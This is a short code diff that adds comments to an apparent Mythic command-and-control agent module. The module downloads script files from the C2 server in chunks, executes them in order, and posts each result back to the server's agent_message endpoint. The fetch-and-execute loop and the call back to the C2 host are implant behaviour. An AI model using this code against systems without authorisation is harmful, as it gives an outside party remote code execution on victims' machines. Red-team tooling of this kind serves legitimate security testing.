@@ -7,6 +7,7 @@ import uuid
 CHUNK_SIZE = 512 * 1024  # 512 KB
 
 
+# Requests a single chunk of a Mythic-hosted file via the upload wire protocol and returns the response dict
 def _fetch_chunk(callback_id, task_id, file_id, chunk_num):
     import agent  # deferred to avoid circular import — agent.py imports this module
     body = {
@@ -28,6 +29,7 @@ def _fetch_chunk(callback_id, task_id, file_id, chunk_num):
     return resp.get("responses", [{}])[0]
 
 
+# Posts one script's output back to Mythic. is_last marks the task completed on the final script.
 def _post_script_result(callback_id, task_id, output, is_last):
     import agent  # deferred to avoid circular import — agent.py imports this module
     body = {
@@ -44,6 +46,8 @@ def _post_script_result(callback_id, task_id, output, is_last):
     agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
 
 
+# Iterates over a list of Mythic file IDs, fetching and executing each script in order,
+# posting incremental results after each one and marking the task complete on the last
 def execute(params, task_id, callback_id):
     import agent  # deferred to avoid circular import — agent.py imports this module
     try:
